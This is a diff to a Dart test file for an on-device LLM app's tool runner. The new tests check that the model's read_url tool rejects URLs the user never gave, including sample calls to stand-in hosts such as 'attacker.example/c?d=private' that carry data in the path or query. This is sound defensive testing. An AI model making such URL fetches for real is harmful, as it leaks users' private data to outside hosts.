@@ -1,5 +1,8 @@
 import 'package:dio/dio.dart';
+import 'package:drift/native.dart';
 import 'package:flutter_test/flutter_test.dart';
+import 'package:ondevice_llm/data/local/database/app_database.dart';
+import 'package:ondevice_llm/features/knowledge/knowledge_store.dart';
 import 'package:ondevice_llm/data/network/web_search/duckduckgo_scraper.dart';
 import 'package:ondevice_llm/data/network/web_search/search_models.dart';
 import 'package:ondevice_llm/data/network/web_search/web_page_reader.dart';
@@ -83,6 +86,23 @@ class _Reader extends WebPageReader {
   }
 }
 
+class _RedirectReader extends WebPageReader {
+  final Uri to;
+  _RedirectReader(this.to);
+  @override
+  Future<WebPage> read(
+    Uri uri, {
+    CancelToken? cancelToken,
+    Duration timeout = const Duration(seconds: 12),
+    String language = 'en-US,en;q=0.9',
+  }) async => WebPage(
+    title: 'Moved',
+    text: 'Page',
+    finalUri: to,
+    fetchedAt: DateTime.utc(2026, 9, 19),
+  );
+}
+
 class _SponsoredSearch extends DuckDuckGoScraper {
   @override
   Future<List<SearchResult>> search(
@@ -109,10 +129,14 @@ class _SponsoredSearch extends DuckDuckGoScraper {
   ];
 }
 
-ToolRunner _runner(String pageText) => ToolRunner(
+ToolRunner _runner(
+  String pageText, {
+  String userText = 'Read https://example.org/pg',
+}) => ToolRunner(
   scraper: _Search(),
   reader: _Reader(pageText),
   settings: const InferenceSettings(webMode: WebMode.auto, toolsEnabled: true),
+  userText: userText,
 );
 
 ToolCall _call(String name, Map<String, Object> args) => ToolCall(
@@ -123,6 +147,17 @@ ToolCall _call(String name, Map<String, Object> args) => ToolCall(
 );
 
 void main() {
+  test('source keys keep path and query case (P2-49)', () {
+    expect(
+      ToolRunner.sourceKey('https://example.com/Foo'),
+      isNot(ToolRunner.sourceKey('https://example.com/foo')),
+    );
+    expect(
+      ToolRunner.sourceKey('https://WWW.Example.com/a/'),
+      ToolRunner.sourceKey('http://example.com/a'),
+    );
+  });
+
   test(
     'biography recipe searches Wikipedia before independent sources',
     () async {
@@ -165,6 +200,155 @@ void main() {
     expect(out.output, endsWith('END'));
     expect(out.output, isNot(contains('long page')));
     expect(out.output.length, lessThanOrEqualTo(ToolRunner.maxReadChars));
+  });
+
+  test(
+    'read_url refuses a page nobody linked or found (audit P2-01)',
+    () async {
+      final r = _runner('Secret page', userText: 'What is the default port?');
+      final out = await r.run(
+        _call('read_url', {'url': 'https://attacker.example/c?d=private'}),
+      );
+      expect(out.ok, isFalse);
+      expect(out.output, contains('Search for it first'));
+      // A search result may be read; another page on its site may not,
+      // since a found page could carry a secret out in its own path.
+      await r.run(_call('search_web', {'query': 'default port'}));
+      final found = await r.run(
+        _call('read_url', {'url': 'https://example.org/pg'}),
+      );
+      expect(found.ok, isTrue);
+      final pathLeak = await r.run(
+        _call('read_url', {'url': 'https://example.org/private-name-here'}),
+      );
+      expect(pathLeak.ok, isFalse);
+      final leak = await r.run(
+        _call('read_url', {'url': 'https://example.org/x?q=private'}),
+      );
+      expect(leak.ok, isFalse);
+      // Letter case in a path can carry data too.
+      final cased = await r.run(
+        _call('read_url', {'url': 'https://example.org/PG'}),
+      );
+      expect(cased.ok, isFalse);
+      // A site the user named is matched by its whole name only.
+      final named = _runner('Page', userText: 'Look at github.com for it');
+      final ok = await named.run(
+        _call('read_url', {'url': 'https://www.github.com/'}),
+      );
+      expect(ok.ok, isTrue);
+      // Naming a site opens its home page, not any path on it.
+      final deep = await named.run(
+        _call('read_url', {'url': 'https://github.com/a?b=1'}),
+      );
+      expect(deep.ok, isFalse);
+      final part = await named.run(
+        _call('read_url', {'url': 'https://hub.com/x'}),
+      );
+      expect(part.ok, isFalse);
+    },
+  );
+
+  test(
+    'a user URL names its host, not names in its path or user info',
+    () async {
+      Future<bool> may(String user, String url) async => (await _runner(
+        'Page',
+        userText: user,
+      ).run(_call('read_url', {'url': url}))).ok;
+      const link = 'Read https://docs.example/a/evil.example/b?x=leak.example';
+      expect(await may(link, 'https://docs.example/'), isTrue);
+      expect(
+        await may(link, 'https://docs.example/a/evil.example/b?x=leak.example'),
+        isTrue,
+      );
+      expect(await may(link, 'https://docs.example/other'), isFalse);
+      expect(await may(link, 'https://evil.example/c'), isFalse);
+      expect(await may(link, 'https://leak.example/c'), isFalse);
+      const info = 'See https://evil.example@good.example/page';
+      expect(await may(info, 'https://good.example/page'), isTrue);
+      expect(await may(info, 'https://evil.example/x'), isFalse);
+      expect(
+        await may('mail me at bob@evil.example', 'https://evil.example/x'),
+        isFalse,
+      );
+      expect(
+        await may('try example.net/path', 'https://example.net/path'),
+        isTrue,
+      );
+      expect(
+        await may('try example.net/path', 'https://example.net/q'),
+        isFalse,
+      );
+      // Brackets and sentence punctuation are not part of a link.
+      expect(
+        await may('Read [site](https://example.org).', 'https://example.org/'),
+        isTrue,
+      );
+      expect(
+        await may('See <https://example.org/a>.', 'https://example.org/a'),
+        isTrue,
+      );
+      expect(
+        await may('Is it https://example.org/a?', 'https://example.org/a'),
+        isTrue,
+      );
+    },
+  );
+
+  test('a page a read was redirected to may be read again', () async {
+    final r = ToolRunner(
+      scraper: _Search(),
+      reader: _RedirectReader(Uri.parse('https://example.org/moved')),
+      settings: const InferenceSettings(
+        webMode: WebMode.auto,
+        toolsEnabled: true,
+      ),
+      userText: 'Read https://short.example/x',
+    );
+    expect(
+      (await r.run(_call('read_url', {'url': 'https://short.example/x'}))).ok,
+      isTrue,
+    );
+    expect(
+      (await r.run(_call('read_url', {'url': 'https://example.org/moved'}))).ok,
+      isTrue,
+    );
+    expect(
+      (await r.run(_call('read_url', {'url': 'https://example.org/else'}))).ok,
+      isFalse,
+    );
+  });
+
+  test('web-only and actions-only turns never run an external tool', () async {
+    for (final mode in ['web', 'actions']) {
+      var ran = 0;
+      final r = ToolRunner(
+        scraper: _Search(),
+        reader: _Reader('Page'),
+        settings: const InferenceSettings(
+          webMode: WebMode.auto,
+          toolsEnabled: true,
+        ),
+        webOnly: mode == 'web',
+        actionsOnly: mode == 'actions',
+        externalTools: const [
+          ToolSpec(name: 'mcp_files', description: 'Files', parameters: {}),
+        ],
+        externalRun: (call) async {
+          ran++;
+          return ToolResult(
+            call: call,
+            output: 'secret',
+            ok: true,
+            elapsedMs: 0,
+          );
+        },
+      );
+      final out = await r.run(_call('mcp_files', {'path': '/'}));
+      expect(ran, 0, reason: mode);
+      expect(out.ok, isFalse, reason: mode);
+    }
   });
 
   test('SearchResult.withPage preserves metadata omitted by the caller', () {
@@ -320,6 +504,44 @@ void main() {
       );
     },
   );
+
+  test('remote research with Tools off offers only the web tools (P1-04)', () {
+    final runner = ToolRunner(
+      scraper: _Search(),
+      reader: _Reader('Page'),
+      settings: const InferenceSettings(
+        webMode: WebMode.auto,
+        toolsEnabled: true,
+      ),
+      remote: true,
+      webOnly: true,
+      recall: (_) async => 'note',
+      externalTools: const [
+        ToolSpec(name: 'mcp_files', description: 'x', parameters: {}),
+      ],
+    );
+    final names = runner.specs().map((s) => s.name).toSet();
+    expect(names, contains('search_web'));
+    expect(names.difference(ToolRunner.webTools), isEmpty);
+  });
+
+  test('a remote model gets Knowledge only with document sharing (P1-03)', () {
+    final db = AppDatabase.forTesting(NativeDatabase.memory());
+    addTearDown(db.close);
+    ToolRunner runner(bool share) => ToolRunner(
+      scraper: _Search(),
+      reader: _Reader('Page'),
+      knowledge: KnowledgeStore(db),
+      remote: true,
+      settings: InferenceSettings(
+        toolsEnabled: true,
+        knowledgeCollection: 'Manuals',
+        remoteDocuments: share,
+      ),
+    );
+    expect(runner(true).documentsAllowed, isTrue);
+    expect(runner(false).documentsAllowed, isFalse);
+  });
 
   test('with tools on, action tools join the others only when asked', () {
     final names = _runner('x').specs().map((s) => s.name).toSet();
